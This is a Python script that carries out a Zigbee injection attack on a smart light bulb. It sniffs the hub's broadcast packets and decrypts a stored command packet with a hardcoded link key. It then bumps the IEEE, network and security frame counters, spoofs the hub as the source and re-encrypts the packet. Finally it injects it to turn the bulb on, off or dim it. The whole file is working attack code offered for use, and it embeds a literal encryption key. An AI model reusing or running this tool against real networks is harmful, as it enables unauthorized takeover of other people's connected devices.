__author__ = 'Soteria'

# 1. Sniff link-status and route request messages
# 2. Extract relevant sequence numbers:
    ## IEEE sequence number
    ## zigbee NWK sequence number
    ## security header - Frame Counter
# 3. Create new packet:
# 4. Change sequence numbers in the new packet
# 5. Create new packet data
# 6. Encrypt the data with the keyc1
# 7. Inject!

import dill  # In order to save and load packet from file
import PrintHelper
import logging
log_killerbee = logging.getLogger('scapy.killerbee')
import struct
try:
	from scapy.all import *
except ImportError:
	print 'This Requires Scapy To Be Installed.'
	from sys import exit
	exit(-1)

from killerbee import *
from killerbee.scapy_extensions import *
import InjectionHelper
del hexdump
from scapy.utils import hexdump				# Force using Scapy's hexdump()
import os


# STATIC DEFAULTS:
TARGET_DEVICE_ID = "45BA" # "F973" # light bulb to be hacked
DEFAULT_KB_CHANNEL = 11
DEFAULT_KB_DEVICE = '10.10.10.2'
SOURCE_DEVICE_ID = '0x0000' # Spoofed device ID (smart hub)
command_packet_file = "command_packet_format"
dim_packet_file = "dim_packet_format"
TURN_ON_COMMAND_CODE = 1
TURN_OFF_COMMAND_CODE = 0
DEFAULT_COMMAND = TURN_ON_COMMAND_CODE
LEVEL_CONTROL_CLUSTER = 8
ON_OFF_CLUSTER = 6
DEFAULT_CLUSTER = ON_OFF_CLUSTER
LOW_DIM_VALUE = '\x03\x0f\x00'
HIGH_DIM_VALUE = '\xff\x0f\x00'
LINK_KEY = '\xdf\x42\xb5\x95\x6a\x2b\xbd\x46\x18\x8d\x59\x0a\xdb\x04\xb6\x09'
revealing_speed = 0.01

# DYNAMIC DEFAULTS:
DEFAULT_LAST_ZIGBEE_APP_LAYER_COUNTER = 163
DEFAULT_LAST_ZIGBEE_CLUSTER_SEQ_NUM = 15


command = DEFAULT_COMMAND
cluster_type = DEFAULT_CLUSTER
if len(sys.argv) < 2:
    print "No command specified, turning on"
else:
    user_input_command = sys.argv.pop(1)
    if len(sys.argv) == 2:
        user_input_command_arg = sys.argv.pop(1)
    if (user_input_command.lower()) == "on":
        command = TURN_ON_COMMAND_CODE
        print "Command: Turn on"
    elif user_input_command.lower() == "off":
        command = TURN_OFF_COMMAND_CODE
        print "Command: Turn off"
    elif user_input_command.lower() == "dim":
        cluster_type = LEVEL_CONTROL_CLUSTER
        command = TURN_OFF_COMMAND_CODE
        if (user_input_command_arg.lower() == "down"):
            dim_value = LOW_DIM_VALUE
            print "Command: Dim down"
        elif (user_input_command_arg.lower() == "up"):
            dim_value = HIGH_DIM_VALUE
            print "Command: Dim up"



# Sniff packets to a list, print it to screen and extract data:
print "Sniffing broadcast packets..."
found_hub_link_status = False
while not found_hub_link_status:
    packetsList = kbsniff(channel = DEFAULT_KB_CHANNEL, count = 1, iface = DEFAULT_KB_DEVICE, store = 1)
    lastPacket = packetsList[0]
    if (lastPacket.payload.fields['src_addr'] == 0):
        found_hub_link_status = True
        print "Found packet from hub with sequence number " + str(lastPacket.fields['seqnum'])


# Load command packet from file:
if cluster_type == ON_OFF_CLUSTER:
    encrypted_command_packet = dill.load(open(command_packet_file))
else:
    encrypted_command_packet = dill.load(open(dim_packet_file))

# Save packet
#dill.dump(lastPacket, open(command_packet_file, "w"))



# Extracting the MIC from the packet payload:
encrypted_command_packet.mic = encrypted_command_packet.payload.payload.payload.fields['data'][-6:-2]
# Omitting the data by 6 (to get rid of the FCS + MIC):
encrypted_command_packet.payload.payload.payload.fields['data'] = encrypted_command_packet.payload.payload.payload.fields['data'][:-6]
print "Payload is encrypted!"
print "Decrypting message..."
print "Encrypted: " + encrypted_command_packet.payload.payload.payload.fields['data'].encode('hex')
decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 0)
PrintHelper.reaviling_string("Decrypted: ", decrypted_command_packet_payload.do_build().encode('hex'), 0.006)
print ""

# Load sequence numbers from last broadcast packet:
ieee_seq_num = lastPacket.fields['seqnum']
zigbeeNWK_seq_num = lastPacket.getlayer(ZigbeeNWK).fields['seqnum']
zigbee_frame_counter = lastPacket.getlayer(ZigbeeSecurityHeader).fields['fc']


# Advance injected packet sequence numbers
next_ieee_seq_num = ieee_seq_num + 1
next_zigbeeNWK_seq_num = zigbeeNWK_seq_num + 2
next_zigbee_frame_counter = zigbee_frame_counter + 1
next_zigbee_app_counter = DEFAULT_LAST_ZIGBEE_APP_LAYER_COUNTER + 1
next_zigbee_cluster_seq_num = DEFAULT_LAST_ZIGBEE_CLUSTER_SEQ_NUM + 1



# Update fields upon crafted sequence numbers:
encrypted_command_packet.fields['seqnum'] = next_ieee_seq_num
encrypted_command_packet.getlayer(ZigbeeNWK).fields['seqnum'] = next_zigbeeNWK_seq_num
encrypted_command_packet.getlayer(ZigbeeSecurityHeader).fields['fc'] = next_zigbee_frame_counter
encrypted_command_packet.payload.fields['dest_addr'] = int(TARGET_DEVICE_ID,16)
encrypted_command_packet.payload.payload.fields['destination'] = int(TARGET_DEVICE_ID,16)

# Update command fields:
if cluster_type == ON_OFF_CLUSTER:
    decrypted_command_packet_payload.payload.fields['transaction_sequence'] = next_zigbee_cluster_seq_num
    decrypted_command_packet_payload.fields['counter'] = next_zigbee_app_counter
    decrypted_command_packet_payload.payload.fields['command_identifier'] = command
    decrypted_command_packet_payload.fields['cluster'] = cluster_type
else:
    decrypted_command_packet_payload.fields['load'] = decrypted_command_packet_payload.fields['load'][:-4] + dim_value

#decrypted_command_packet_payload.payload.fields['disable_default_response'] = 0

print "Decrypted payload to inject: " + decrypted_command_packet_payload.do_build().encode('hex')

sys.stdout.write("Encrypting message...")
encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypted_command_packet_payload, key = LINK_KEY, verbose = 0)
sys.stdout.write("\rEncrypting message... DONE!  " + encrypted_command_packet_to_inject.payload.payload.payload.fields['data'].encode('hex'))
print ""


PrintHelper.print_string_as_packet("Injecting packet with data", encrypted_command_packet_to_inject.do_build().encode('hex'))
print ""
kbsendp(encrypted_command_packet_to_inject, channel = DEFAULT_KB_CHANNEL, inter = 0, loop = 0, iface = DEFAULT_KB_DEVICE, count = 1, verbose = 3)